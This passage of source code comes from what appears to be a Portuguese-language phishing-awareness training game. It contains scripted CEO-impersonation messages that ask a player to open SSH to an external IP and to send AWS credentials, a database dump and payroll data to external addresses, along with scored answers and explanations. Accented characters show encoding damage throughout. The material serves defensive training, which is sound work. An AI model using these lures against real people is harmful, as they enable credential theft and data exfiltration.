      <div class="wz-topbar-status">NÃºmero nÃ£o salvo Â· online</div>
    </div>
    <div class="wz-topbar-icons"><span>ðŸ“ž</span><span>â‹®</span></div>
  </div>
  <div class="wz-chat-bg">
    <div class="wz-date-label">HOJE</div>
    <div class="wz-msg-row incoming">
      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="techzap_logo.svg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
      <div class="wz-bubble">
        <div class="wz-bubble-sender" style="color:#e53935;">âš ï¸ NÃºmero Desconhecido</div>
        Aqui Ã© o RogÃ©rio CEO. Estou em Nova York fechando um contrato de aquisiÃ§Ã£o. Preciso que vocÃª libere <strong>agora</strong> o IP 198.51.100.22 no firewall SSH. <strong>NÃ£o fale com ninguÃ©m sobre isso.</strong>
        
        <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir auditoria da sessÃ£o">
          <div class="wz-doc-icon-box">ðŸ“„</div>
          <div class="wz-doc-info">
            <div class="wz-doc-title">liberacao_porta_22_ssh.conf</div>
            <div class="wz-doc-meta">85 KB Â· DOCUMENTO ENVIADO</div>
          </div>
          <div class="wz-doc-dl-icon">â¬‡</div>
        </div>
        <div class="wz-doc-hint-text">ðŸ” Clique no documento para abrir a auditoria de sessÃ£o</div>
        <div class="wz-bubble-footer"><span class="wz-bubble-time">17:28</span></div>
      </div>
    </div>
  </div>
  <div class="wz-input-bar">
    <span>ðŸ˜Š</span>
    <input class="wz-input-field" value="Digite uma mensagem..." readonly>
    <button class="wz-send-btn">âž¤</button>
  </div>
</div>`,
        inspector: { type: 'url', label: 'Auditoria de NÃºmero de Telefone', dest: 'Telefone: +1 (555) 019-2831 â€” VOIP nÃ£o registrado nos sistemas TechCore | AÃ§Ã£o solicitada: LiberaÃ§Ã£o de Porta 22 (SSH) para IP externo' },
        actions: [
          { id: 'a1', label: 'ðŸš¨ Denunciar NÃºmero & Bloquear no Gateway', correct: true, toastMsg: 'NÃºmero falso bloqueado.', logTitle: 'Fraude do CEO no WhatsApp Neutralizada', consequence: 'Tentativa de manipulaÃ§Ã£o executiva abortada e registrada no relatÃ³rio de incidentes.', explanation: 'Perfeito! NÃºmero VOIP desconhecido, nÃ£o registrado na TechCore. O CEO RogÃ©rio usa exclusivamente os canais oficiais internos.' },
          { id: 'a2', label: 'ðŸ”“ Abrir Porta SSH no Firewall', correct: false, toastMsg: 'Porta liberada.', logTitle: 'Porta SSH Exposta a Invasores', consequence: 'Os criminosos invadiram o gateway central atravÃ©s da porta liberada por nÃºmero falso.', explanation: 'Fraude clÃ¡ssica de CEO (CEO Fraud). NÃºmero VOIP + pedido de sigilo + urgÃªncia = ataque de engenharia social.' }
        ]
      }
    ]
  },

  // ----------------------------------------------------
  // TURNO 4: ContrainteligÃªncia & Envio de Arquivos (TechVault)
  // ----------------------------------------------------
  {
    shiftNumber: 4,
    title: 'Turno 4: ContrainteligÃªncia & Envio de Arquivos',
    brandName: 'TechVault',
    brandIcon: 'ðŸ“¦',
    url: 'https://vault-dispatch.techcore.internal/ops/#honeytokens',
    wordContent: `
      <h2>1. PROTOCOLO DE DESPACHO SEGURO (TECHVAULT)</h2>
      <p>Nesta fase de contrainteligÃªncia, <strong>APENAS</strong> os 3 arquivos e destinos abaixo foram autorizados pelo CEO RogÃ©rio Silva:</p>
      <ul>
        <li><code>honeytoken_trap_v4.vault</code> âž” <code>dropzone-trap@techcore-vault.internal</code> (Isca C2)</li>
        <li><code>hotfix_auth_patch.enc</code> âž” <code>deploy-cluster@techcore-vault.internal</code> (Cluster de Prod)</li>
        <li><code>ciso_master_report.sig</code> âž” <code>board-vault@techcore-vault.internal</code> (Conselho Executivo)</li>
      </ul>

      <h2>2. REGRAS RÃGIDAS DE BLOQUEIO DE FRAUDES</h2>
      <ul>
        <li><strong>AtenÃ§Ã£o:</strong> Todos os e-mails neste turno utilizam o nome e e-mail do CEO RogÃ©rio Silva (<code>rogerio.ceo@techcore.com</code>).</li>
        <li>Verifique se a combinaÃ§Ã£o de <em>arquivo</em> + <em>destino</em> corresponde exatamente aos 3 itens autorizados acima.</li>
        <li>Qualquer pedido de envio de credenciais reais (<code>aws_credentials.json</code>), dumps de banco (<code>database_full_dump.sql</code>), dados de folha de pagamento ou arquivos para destinos externos / imprensa Ã© <strong>FALSO</strong> e deve ser <strong>REJEITADO</strong>.</li>
      </ul>
    `,
    ceoDialogues: [
      {
        step: 1,
        text: `
          <p>Chegamos ao turno decisivo da nossa campanha, Analista! O <strong>Turno 4</strong> Ã© a nossa contraofensiva final.</p>
          <p>Com as evidÃªncias dos turnos anteriores, vamos armar uma <strong>emboscada digital (Honeytokens)</strong> e despachar correÃ§Ãµes crÃ­ticas.</p>
        `
      },
      {
        step: 2,
        text: `
          <p>Ativei o <strong>TechVault (Despachador Seguro de Arquivos)</strong> na sua estaÃ§Ã£o.</p>
          <p><strong>ðŸš¨ ALERTA CRÃTICO:</strong> Descobrimos que os atacantes estÃ£o enviando e-mails se passando por MIM! Todos os e-mails parecerÃ£o vir de <code>rogerio.ceo@techcore.com</code>.</p>
        `
      },
      {
        step: 3,
        text: `
          <p>Confira com extrema atenÃ§Ã£o a lista dos 3 Ãºnicos pares de arquivo e destino autorizados no <strong>Word (Procedimentos_TI.doc)</strong>!</p>
          <p>Neste turno final, a tolerÃ¢ncia Ã© mÃ­nima: vocÃª pode cometer <strong>NO MÃXIMO 1 ERRO</strong>. Foco total!</p>
        `
      }
    ],
    scenarios: [
      {
        id: 's4-1',
        channel: 'vault',
        time: '09:15',
        senderName: 'CEO RogÃ©rio Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarImg: 'ceo_rogerio.jpg',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[ORDEM DIRETA] Despachar Arquivo Honeytoken: honeytoken_trap_v4.vault',
        snippet: 'Despache a armadilha com tokens falsos para o dropzone oficial da perÃ­cia...',
        attachmentFileName: 'honeytoken_trap_v4.vault',
        meta: { 'De': 'CEO RogÃ©rio Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'honeytoken_trap_v4.vault', 'Destino': 'dropzone-trap@techcore-vault.internal', 'Data': '09:12', 'Prioridade': 'MÃXIMA (CEO)' },
        body: `<p>InstruÃ§Ã£o Direta do CEO RogÃ©rio:</p><div class="email-quote-box"><p>"Analista, envie agora o arquivo <code>honeytoken_trap_v4.vault</code> para o endereÃ§o de armadilha oficial <code>dropzone-trap@techcore-vault.internal</code> para rastrearmos a origem do grupo hacker."</p></div>`,
        inspector: { type: 'url', label: 'InspeÃ§Ã£o de Despacho de Arquivo', dest: 'Arquivo: honeytoken_trap_v4.vault -> Destino: dropzone-trap@techcore-vault.internal' },
        actions: [
          { id: 'a1', label: 'ðŸš€ Despachar honeytoken_trap_v4.vault para o Cofre Oficial', correct: true, toastMsg: 'Honeytoken despachado com sucesso.', logTitle: 'Armadilha Honeytoken Ativada', consequence: 'O grupo hacker mordeu a isca e seus endereÃ§os IP foram triangulados pela polÃ­cia.', explanation: 'Ordem oficial do CEO RogÃ©rio cumprida com precisÃ£o de acordo com o Word.' },
          { id: 'a2', label: 'ðŸš« Cancelar Envio', correct: false, toastMsg: 'Envio cancelado.', logTitle: 'OperaÃ§Ã£o de ContrainteligÃªncia Abortada', consequence: 'A emboscada falhou e a gangue conseguiu escapar sem ser rastreada.', explanation: 'O arquivo e destino estavam estritamente autorizados no Word.' }
        ]
      },
      {
        id: 's4-2',
        channel: 'vault',
        time: '10:30',
        senderName: 'CEO RogÃ©rio Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarImg: 'ceo_rogerio.jpg',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[URGENTE/AUDITORIA] Envio ObrigatÃ³rio do Arquivo aws_credentials.json',
        snippet: 'Envie imediatamente as credenciais da AWS para o bucket de validaÃ§Ã£o externa...',
        attachmentFileName: 'aws_credentials.json',
        meta: { 'De': 'CEO RogÃ©rio Silva <rogerio.ceo@techcore.com>', 'Arquivo Solicitado': 'aws_credentials.json', 'Destino': 'exfil-bucket@aws-cloud-verify.net', 'Data': '10:28' },
        body: `<p>SolicitaÃ§Ã£o do CEO RogÃ©rio:</p><div class="email-quote-box"><p>"Precisamos passar por uma auditoria de emergÃªncia da nuvem. Despache o arquivo <code>aws_credentials.json</code> para o bucket <code>exfil-bucket@aws-cloud-verify.net</code> imediatamente."</p></div>`,
        inspector: { type: 'url', label: 'InspeÃ§Ã£o de Destino de Arquivo', dest: 'Arquivo: aws_credentials.json -> Destino: exfil-bucket@aws-cloud-verify.net' },
        actions: [
          { id: 'a1', label: 'ðŸš€ Despachar Credenciais AWS', correct: false, toastMsg: 'Chaves enviadas.', logTitle: 'Vazamento Total da Infraestrutura AWS', consequence: 'Os invasores capturaram as chaves reais e assumiram o controle de toda a nuvem.', explanation: 'Golpe! O CEO verdadeiro nunca solicita envio de credenciais reais (aws_credentials.json) nem destinos externos.' },
          { id: 'a2', label: 'ðŸš« Rejeitar SolicitaÃ§Ã£o e Bloquear', correct: true, toastMsg: 'Tentativa de exfiltraÃ§Ã£o bloqueada.', logTitle: 'ExfiltraÃ§Ã£o de Credenciais Interceptada', consequence: 'Tentativa de roubo de chaves da AWS neutralizada com sucesso.', explanation: 'Excelente! Credenciais reais jamais devem ser despachadas e o destino era um servidor externo malicioso.' }
        ]
      },
      {
        id: 's4-3',
        channel: 'vault',
        time: '11:45',
        senderName: 'CEO RogÃ©rio Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarImg: 'ceo_rogerio.jpg',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[DEPLOY EMERGENCIAL] Despacho do Pacote: hotfix_auth_patch.enc',
        snippet: 'Enviar hotfix criptografado de correÃ§Ã£o de vulnerabilidade para o cluster de deploy...',
        attachmentFileName: 'hotfix_auth_patch.enc',
        meta: { 'De': 'CEO RogÃ©rio Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'hotfix_auth_patch.enc', 'Destino': 'deploy-cluster@techcore-vault.internal', 'Data': '11:42', 'Status': 'Assinado' },
        body: `<p>InstruÃ§Ã£o de Deploy Seguro:</p><div class="email-quote-box"><p>"Despache o pacote <code>hotfix_auth_patch.enc</code> para o cluster de deploy <code>deploy-cluster@techcore-vault.internal</code> para aplicar o patch que bloqueia a brecha de seguranÃ§a."</p></div>`,
        inspector: { type: 'url', label: 'InspeÃ§Ã£o de Pacote de Patch', dest: 'Arquivo: hotfix_auth_patch.enc -> Destino: deploy-cluster@techcore-vault.internal' },
        actions: [
          { id: 'a1', label: 'ðŸš€ Despachar hotfix_auth_patch.enc para Deploy', correct: true, toastMsg: 'Patch despachado e aplicado.', logTitle: 'Patch de SeguranÃ§a Aplicado em ProduÃ§Ã£o', consequence: 'Vulnerabilidades corrigidas em todos os servidores da TechCore.', explanation: 'Envio do arquivo correto para o destino interno seguro conforme manual do Word.' },
          { id: 'a2', label: 'ðŸš« Rejeitar Despacho do Patch', correct: false, toastMsg: 'Patch nÃ£o enviado.', logTitle: 'Atraso em CorreÃ§Ã£o CrÃ­tica', consequence: 'Servidores continuaram vulnerÃ¡veis por falta de aplicaÃ§Ã£o do hotfix.', explanation: 'O pacote de correÃ§Ã£o foi requisitado legitimamente e bate com as regras do Word.' }
        ]
      },
      {
        id: 's4-4',
        channel: 'vault',
        time: '13:20',
        senderName: 'CEO RogÃ©rio Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarImg: 'ceo_rogerio.jpg',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[IMPRENSA] CÃ³pia Externa do RelatÃ³rio Forense: ciso_master_report.sig',
        snippet: 'Favor enviar uma cÃ³pia preliminar do relatÃ³rio para a equipe de jornalismo...',
        attachmentFileName: 'ciso_master_report.sig',
        meta: { 'De': 'CEO RogÃ©rio Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'ciso_master_report.sig', 'Destino': 'vazamentos@techleaks-news.com', 'Data': '13:18' },
        body: `<p>InstruÃ§Ã£o de ComunicaÃ§Ã£o:</p><div class="email-quote-box"><p>"Preciso que vocÃª envie uma cÃ³pia de prÃ©via do <code>ciso_master_report.sig</code> para a imprensa no endereÃ§o <code>vazamentos@techleaks-news.com</code> para demonstrarmos transparÃªncia."</p></div>`,
        inspector: { type: 'url', label: 'InspeÃ§Ã£o de Destino de Arquivo', dest: 'Arquivo: ciso_master_report.sig -> Destino: vazamentos@techleaks-news.com' },
        actions: [
          { id: 'a1', label: 'ðŸš€ Despachar RelatÃ³rio para a Imprensa', correct: false, toastMsg: 'RelatÃ³rio enviado.', logTitle: 'Vazamento de Segredo Corporativo', consequence: 'Dados sigilosos de vulnerabilidades foram publicados na mÃ­dia, causando pÃ¢nico.', explanation: 'Golpe! O relatÃ³rio ciso_master_report.sig sÃ³ pode ser enviado para board-vault@techcore-vault.internal, jamais para a imprensa.' },
          { id: 'a2', label: 'ðŸš« Rejeitar Envio Externo', correct: true, toastMsg: 'Vazamento prevenido.', logTitle: 'Tentativa de ExfiltraÃ§Ã£o para Imprensa Barrada', consequence: 'Sigilo de mercado preservado de acordo com a polÃ­tica corporativa.', explanation: 'Excelente! O destino autorizado no Word Ã© board-vault@techcore-vault.internal.' }
        ]
      },
      {
        id: 's4-5',
        channel: 'vault',
        time: '14:40',
        senderName: 'CEO RogÃ©rio Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarImg: 'ceo_rogerio.jpg',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[BACKUP EMERGENCIAL] Envio do Banco de Dados: database_full_dump.sql',
        snippet: 'Despache o dump completo do banco de produÃ§Ã£o para o servidor de contingÃªncia...',
        attachmentFileName: 'database_full_dump.sql',
        meta: { 'De': 'CEO RogÃ©rio Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'database_full_dump.sql', 'Destino': 'backup-temp@techcore-vault.internal', 'Data': '14:38' },
        body: `<p>InstruÃ§Ã£o de Backup Solicitada:</p><div class="email-quote-box"><p>"Analista, envie o arquivo <code>database_full_dump.sql</code> para o endereÃ§o <code>backup-temp@techcore-vault.internal</code> por seguranÃ§a antes da manutenÃ§Ã£o."</p></div>`,
        inspector: { type: 'url', label: 'InspeÃ§Ã£o de Despacho de Banco', dest: 'Arquivo: database_full_dump.sql -> Destino: backup-temp@techcore-vault.internal' },
        actions: [
          { id: 'a1', label: 'ðŸš€ Despachar Dump do Banco', correct: false, toastMsg: 'Banco despachado.', logTitle: 'ExfiltraÃ§Ã£o de Banco de Dados', consequence: 'Invasores capturaram o arquivo de dump completo contendo todos os dados de clientes.', explanation: 'Falso! O arquivo database_full_dump.sql nÃ£o consta na lista de autorizados do Word.' },
          { id: 'a2', label: 'ðŸš« Rejeitar Envio NÃ£o Autorizado', correct: true, toastMsg: 'Envio de dump rejeitado.', logTitle: 'Tentativa de ExtraÃ§Ã£o de Banco Impedida', consequence: 'Integridade do banco de dados mantida sem exfiltraÃ§Ã£o.', explanation: 'Correto! Apenas honeytoken_trap_v4.vault, hotfix_auth_patch.enc e ciso_master_report.sig sÃ£o autorizados.' }
        ]
      },
      {
        id: 's4-6',
        channel: 'vault',
        time: '15:55',
        senderName: 'CEO RogÃ©rio Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarImg: 'ceo_rogerio.jpg',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[PERÃCIA PARCEIRA] Despacho do Honeytoken: honeytoken_trap_v4.vault',
        snippet: 'Enviar a armadilha de honeytoken para o servidor da consultoria externa de seguranÃ§a...',
        attachmentFileName: 'honeytoken_trap_v4.vault',
        meta: { 'De': 'CEO RogÃ©rio Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'honeytoken_trap_v4.vault', 'Destino': 'external-drop@cloud-analytica.org', 'Data': '15:52' },
        body: `<p>InstruÃ§Ã£o do CEO RogÃ©rio:</p><div class="email-quote-box"><p>"Contratamos uma consultoria externa de perÃ­cia. Por favor, despache o <code>honeytoken_trap_v4.vault</code> para <code>external-drop@cloud-analytica.org</code>."</p></div>`,
        inspector: { type: 'url', label: 'InspeÃ§Ã£o de Destino do Honeytoken', dest: 'Arquivo: honeytoken_trap_v4.vault -> Destino: external-drop@cloud-analytica.org' },
        actions: [
          { id: 'a1', label: 'ðŸš€ Despachar Honeytoken para Consultoria', correct: false, toastMsg: 'Arquivo enviado para servidor externo.', logTitle: 'Vazamento de Isca de ContrainteligÃªncia', consequence: 'A armadilha foi enviada para um servidor malicioso externo, revelando nossa estratÃ©gia de defesa aos hackers.', explanation: 'Falso! O destino correto do honeytoken Ã© dropzone-trap@techcore-vault.internal (servidor interno de captura).' },
          { id: 'a2', label: 'ðŸš« Rejeitar Destino Incorreto', correct: true, toastMsg: 'Envio bloqueado por destino invÃ¡lido.', logTitle: 'Desvio de Isca Neutralizado', consequence: 'Armadilha preservada para o destino correto.', explanation: 'Perfeito! O arquivo era o correto, mas o destino era um servidor externo nÃ£o autorizado no Word.' }
        ]
      },
      {
        id: 's4-7',
        channel: 'vault',
        time: '16:40',
        senderName: 'CEO RogÃ©rio Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarImg: 'ceo_rogerio.jpg',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[REVISÃƒO FINANCEIRA] Envio do Arquivo: folha_pagamento_executivos.xlsx',
        snippet: 'Envie a planilha de salÃ¡rios para a auditoria contÃ¡bil de urgÃªncia...',
        attachmentFileName: 'folha_pagamento_executivos.xlsx',
        meta: { 'De': 'CEO RogÃ©rio Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'folha_pagamento_executivos.xlsx', 'Destino': 'auditoria-rh@consultoria-externa.net', 'Data': '16:38' },
        body: `<p>SolicitaÃ§Ã£o de Envio:</p><div class="email-quote-box"><p>"Analista, preciso que envie o arquivo <code>folha_pagamento_executivos.xlsx</code> para <code>auditoria-rh@consultoria-externa.net</code> para fechamento fiscal."</p></div>`,
        inspector: { type: 'url', label: 'InspeÃ§Ã£o de Arquivo e Destino', dest: 'Arquivo: folha_pagamento_executivos.xlsx -> Destino: auditoria-rh@consultoria-externa.net' },
        actions: [
          { id: 'a1', label: 'ðŸš€ Despachar Planilha Financeira', correct: false, toastMsg: 'Planilha enviada.', logTitle: 'Vazamento de Dados Financeiros', consequence: 'Dados salariais confidenciais vazados para terceiros nÃ£o autorizados.', explanation: 'Falso! Arquivos de folha de pagamento nÃ£o sÃ£o autorizados para despacho no TechVault.' },
          { id: 'a2', label: 'ðŸš« Rejeitar Despacho de Planilha', correct: true, toastMsg: 'Envio negado.', logTitle: 'ProteÃ§Ã£o de Dados Financeiros Mantida', consequence: 'InformaÃ§Ãµes de folha de pagamento protegidas.', explanation: 'Excelente! SolicitaÃ§Ã£o nÃ£o autorizada pelo protocolo do manual do Word.' }
        ]
      },
      {
        id: 's4-8',
        channel: 'vault',
        time: '17:45',
        senderName: 'CEO RogÃ©rio Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarImg: 'ceo_rogerio.jpg',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[FINAL DE EXPEDIENTE] Envio do RelatÃ³rio Final: ciso_master_report.sig',
        snippet: 'Encaminhe o pacote final de auditoria para o cofre seguro da Diretoria Executiva...',
        attachmentFileName: 'ciso_master_report.sig',
        meta: { 'De': 'CEO RogÃ©rio Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'ciso_master_report.sig', 'Destino': 'board-vault@techcore-vault.internal', 'Data': '17:42', 'Prioridade': 'CONCLUSAO DE OPERAÃ‡ÃƒO' },
        body: `<p>Ãšltima AÃ§Ã£o do Turno 4:</p><div class="email-quote-box"><p>"Analista, despache o relatÃ³rio <code>ciso_master_report.sig</code> para <code>board-vault@techcore-vault.internal</code> para finalizarmos a auditoria oficial e apresentarmos ao Conselho de AdministraÃ§Ã£o!"</p></div>`,
        inspector: { type: 'url', label: 'InspeÃ§Ã£o de Despacho Final', dest: 'Arquivo: ciso_master_report.sig -> Destino: board-vault@techcore-vault.internal' },
        actions: [
          { id: 'a1', label: 'ðŸš€ Despachar ciso_master_report.sig para a Diretoria', correct: true, toastMsg: 'RelatÃ³rio final entregue Ã  Diretoria.', logTitle: 'Auditoria ConcluÃ­da com Sucesso', consequence: 'RelatÃ³rio master entregue ao conselho e campanha finalizada com louvor!', explanation: 'Perfeita conclusÃ£o da campanha dos 4 turnos da TechCore.' },
          { id: 'a2', label: 'ðŸš« Rejeitar Despacho', correct: false, toastMsg: 'Despacho rejeitado.', logTitle: 'Atraso na Entrega da Auditoria', consequence: 'A reuniÃ£o do conselho de administraÃ§Ã£o nÃ£o recebeu o relatÃ³rio final.', explanation: 'O relatÃ³rio final oficial foi solicitado expressamente pelo CEO e atende a todos os critÃ©rios do Word.' }
        ]
      }
    ]
  }
];

// ==========================================
// MAIN SIMULATOR CONTROLLER
// ==========================================
class TechMailSimulator {
  constructor() {
    this.currentShiftIndex = 0;
    this.currentDialogIndex = 0;
    this.processedItems = [];
    this.decisionsHistory = [];
    this.campaignHistory = [];
    this.currentCategoryFilter = 'all';
    this.currentAppView = 'mail'; // 'mail' or 'word'

    this.cacheDOMElements();
    this.bindEvents();
  }

  cacheDOMElements() {
    this.startScreen = document.getElementById('start-screen');
    this.exitScreen = document.getElementById('exit-screen');
    this.ceoDialogModal = document.getElementById('ceo-dialog-modal');
    this.mainWorkspace = document.getElementById('main-workspace');

    this.btnStartShift = document.getElementById('btn-start-shift');
    this.btnExitSite = document.getElementById('btn-exit-site');
    this.btnReopenSite = document.getElementById('btn-reopen-site');

    // Dialogue elements
    this.ceoDialogTitlebar = document.getElementById('ceo-dialog-titlebar');
    this.ceoDialogSpeakerTag = document.getElementById('ceo-dialog-speaker-tag');
    this.ceoSpeechText = document.getElementById('ceo-speech-text');
    this.dialogStepIndicator = document.getElementById('dialog-step-indicator');
    this.btnDialogPrev = document.getElementById('btn-dialog-prev');
    this.btnDialogNext = document.getElementById('btn-dialog-next');
    this.btnStartWorkstationFromDialog = document.getElementById('btn-start-workstation-from-dialog');
    this.btnSkipDialog = document.getElementById('btn-skip-dialog');

    // Views & Tabs
    this.tabBtnMailview = document.getElementById('tab-btn-mailview');
    this.tabBtnWordview = document.getElementById('tab-btn-wordview');
    this.btnOpenWordTab = document.getElementById('btn-open-word-tab');
    this.appWorkspaceBody = document.getElementById('app-workspace-body');
    this.wordDocView = document.getElementById('word-doc-view');
    this.wordDocContent = document.getElementById('word-doc-content');

    // Headers & URL
    this.shiftPillBadge = document.getElementById('shift-pill-badge');
    this.browserTabIcon = document.getElementById('browser-tab-icon');
    this.browserTabTitle = document.getElementById('browser-tab-title');
    this.browserUrlBar = document.getElementById('browser-url-bar');
    this.appBrandIcon = document.getElementById('app-brand-icon');
    this.appBrandName = document.getElementById('app-brand-name');
    this.shiftClock = document.getElementById('shift-clock');
    this.taskbarClock = document.getElementById('taskbar-clock');
    this.taskbarActiveTitle = document.getElementById('taskbar-active-title');
    this.btnSoundToggle = document.getElementById('btn-sound-toggle');
    this.btnWinExit = document.getElementById('btn-win-exit');

    // Desktop icons
    this.diconMail = document.getElementById('dicon-mail');
    this.diconGithub = document.getElementById('dicon-github');
    this.diconIam = document.getElementById('dicon-iam');
    this.diconDb = document.getElementById('dicon-db');
    this.diconZap = document.getElementById('dicon-zap');
    this.diconVault = document.getElementById('dicon-vault');
    this.diconWord = document.getElementById('dicon-word');

    // Sidebar folder rows
    this.folderDbRow = document.getElementById('folder-db-row');
    this.folderZapRow = document.getElementById('folder-zap-row');
    this.folderVaultRow = document.getElementById('folder-vault-row');

    // Tabs in mail header
    this.tabBtnDb = document.getElementById('tab-btn-db');
    this.tabBtnZap = document.getElementById('tab-btn-zap');
    this.tabBtnVault = document.getElementById('tab-btn-vault');
    this.tabDbTag = document.getElementById('tab-db-tag');
    this.tabZapTag = document.getElementById('tab-zap-tag');
    this.tabVaultTag = document.getElementById('tab-vault-tag');

    // Views
    this.inboxListView = document.getElementById('inbox-list-view');
    this.emailItemsContainer = document.getElementById('email-items-container');
    this.emailReaderView = document.getElementById('email-reader-view');
    this.auditReportView = document.getElementById('audit-report-view');
    this.btnBackToInbox = document.getElementById('btn-back-to-inbox');
    this.browserBackBtn = document.getElementById('browser-back-btn');
    this.browserRefreshBtn = document.getElementById('browser-refresh-btn');

    // Badges
    this.badgeEmailCount = document.getElementById('badge-email-count');
    this.badgeGithubCount = document.getElementById('badge-github-count');
    this.badgeIamCount = document.getElementById('badge-iam-count');
    this.badgeDbCount = document.getElementById('badge-db-count');
    this.badgeZapCount = document.getElementById('badge-zap-count');
    this.badgeVaultCount = document.getElementById('badge-vault-count');
    this.badgeDoneCount = document.getElementById('badge-done-count');
    this.tabEmailTag = document.getElementById('tab-email-tag');
    this.tabGithubTag = document.getElementById('tab-github-tag');
    this.tabIamTag = document.getElementById('tab-iam-tag');

    // Reader elements
    this.readerTypeTag = document.getElementById('reader-type-tag');
    this.readerTimeMeta = document.getElementById('reader-time-meta');
    this.readerSubjectTitle = document.getElementById('reader-subject-title');
    this.readerSenderAvatar = document.getElementById('reader-sender-avatar');
    this.readerSenderName = document.getElementById('reader-sender-name');
    this.readerSenderEmail = document.getElementById('reader-sender-email');
    this.readerReceivedTime = document.getElementById('reader-received-time');
    this.btnToggleHeaders = document.getElementById('btn-toggle-headers');
    this.technicalHeadersBox = document.getElementById('technical-headers-box');
    this.headerDe = document.getElementById('header-de');
    this.headerPara = document.getElementById('header-para');
    this.headerData = document.getElementById('header-data');
    this.headerAuth = document.getElementById('header-auth');
    this.readerBodyMessage = document.getElementById('reader-body-message');
    this.readerInspectorSection = document.getElementById('reader-inspector-section');
    this.decisionButtonsGroup = document.getElementById('decision-buttons-group');

    // Toast
    this.actionToast = document.getElementById('action-toast');
    this.toastMsg = document.getElementById('toast-msg');

    // Audit Report Elements
    this.reportThreatsAvoided = document.getElementById('report-threats-avoided');
    this.reportThreatsTaken = document.getElementById('report-threats-taken');
    this.reportHealthFinal = document.getElementById('report-health-final');
    this.reportReputationFinal = document.getElementById('report-reputation-final');
    this.auditStamp = document.getElementById('audit-stamp');
    this.auditTitle = document.getElementById('audit-title');
    this.auditSubText = document.getElementById('audit-sub-text');
    this.auditVerdictTitle = document.getElementById('audit-verdict-title');
    this.auditVerdictText = document.getElementById('audit-verdict-text');
    this.auditTableBody = document.getElementById('audit-table-body');
    this.btnNextShiftAction = document.getElementById('btn-next-shift-action');
    this.btnRestartShift = document.getElementById('btn-restart-shift');
    
    // Cheat Code Elements
    this.cheatCodeInput = document.getElementById('cheat-code-input');
    this.cheatCodeHint = document.getElementById('cheat-code-hint');
    this.cheatCodeArea = document.getElementById('cheat-code-area');
    this.mainMenuContainer = document.getElementById('main-menu-container');
    this.secretLogoStar = document.getElementById('secret-logo-star');
    this.btnCancelCheat = document.getElementById('btn-cancel-cheat');
  }

  getCurrentShift() {
    return CAMPAIGN_SHIFTS[this.currentShiftIndex] || CAMPAIGN_SHIFTS[0];
  }

  bindEvents() {
    // Cheat Code Toggle Logic
    if (this.secretLogoStar) {
      this.secretLogoStar.addEventListener('click', () => {
        if (this.mainMenuContainer && this.cheatCodeArea) {
          audio.click();
          this.mainMenuContainer.style.display = 'none';
          this.cheatCodeArea.style.display = 'flex';
          this.cheatCodeInput.focus();
        }
      });
    }

    if (this.btnCancelCheat) {
      this.btnCancelCheat.addEventListener('click', () => {
        if (this.mainMenuContainer && this.cheatCodeArea) {
          audio.click();
          this.cheatCodeArea.style.display = 'none';
          this.mainMenuContainer.style.display = 'flex';
          this.cheatCodeInput.value = '';
          this.cheatCodeHint.textContent = 'Digite o cÃ³digo e pressione ENTER';
        }
      });
    }

    // Cheat Code Logic
    if (this.cheatCodeInput) {
      this.cheatCodeInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          const code = this.cheatCodeInput.value.trim().toLowerCase();
          let targetShift = -1;
          
          if (code === 'comida') targetShift = 0;
          if (code === 'gremio') targetShift = 1;
          if (code === 'git') targetShift = 2;
          if (code === 'you') targetShift = 3;

          if (targetShift !== -1) {
            audio.click();
            this.currentShiftIndex = targetShift;
            this.campaignHistory = [];
            
            this.cheatCodeHint.textContent = `Acesso concedido: Turno ${targetShift + 1}!`;
            this.cheatCodeHint.style.color = '#4ade80';
            
            setTimeout(() => {
              this.cheatCodeInput.value = '';
              this.cheatCodeHint.textContent = 'Digite o cÃ³digo e pressione ENTER';
              this.cheatCodeHint.style.color = '';
              if (this.mainMenuContainer && this.cheatCodeArea) {
                this.cheatCodeArea.style.display = 'none';
                this.mainMenuContainer.style.display = 'flex';
              }
              this.openCeoDialogueForShift(targetShift);
            }, 1000);
          } else if (code !== '') {
            this.cheatCodeHint.textContent = 'CÃ³digo invÃ¡lido!';
            this.cheatCodeHint.style.color = '#f87171';
            
            setTimeout(() => {
              this.cheatCodeHint.textContent = 'Digite o cÃ³digo e pressione ENTER';
              this.cheatCodeHint.style.color = '';
            }, 2000);
          }
        }
      });
    }

    // 1. Start Shift -> Turno 1
    this.btnStartShift.addEventListener('click', () => {
      audio.click();
      this.currentShiftIndex = 0;
      this.campaignHistory = [];
      this.openCeoDialogueForShift(0);
    });
    this.btnStartShift.addEventListener('mouseenter', () => audio.menuHover());

    // 2. Exit screen
    this.btnExitSite.addEventListener('click', () => {
      audio.click();
      this.startScreen.style.display = 'none';
      this.exitScreen.style.display = 'flex';
    });
    this.btnExitSite.addEventListener('mouseenter', () => audio.menuHover());

    this.btnWinExit.addEventListener('click', () => {
      audio.click();
      this.mainWorkspace.style.display = 'none';
